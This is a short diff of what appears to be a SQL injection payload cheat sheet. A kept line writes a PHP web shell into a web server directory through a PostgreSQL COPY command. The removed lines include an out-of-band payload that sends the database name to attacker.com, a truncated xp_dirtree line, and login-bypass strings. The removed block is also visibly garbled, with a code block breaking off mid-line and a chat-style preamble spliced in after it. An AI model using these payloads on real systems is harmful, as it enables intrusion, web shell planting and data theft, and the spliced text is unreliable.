@@ -78,26 +78,6 @@ pg_sleep(5)
 COPY (SELECT '<?php system($_GET[cmd]); ?>') TO '/var/www/html/shell.php'
 ```
 
-## Out-of-Band Techniques
-
-```
-||UTL_HTTP.request('http://attacker.com/'||database())--
-EXEC master..xp_dirtree '\\att
-
-continue
-
- Here’s a list of common SQL injection (SQLi) payloads categorized by attack type. These can be used for testing and understanding SQL injection vulnerabilities (only in authorized environments like penetration testing or CTFs).
-
----
-
-### **1. Basic Authentication Bypass**
-```sql
-' OR '1'='1
-' OR 1=1 -- 
-" OR "" = "
-admin' --
-admin' OR '1'='1
-```
 
 ---
 
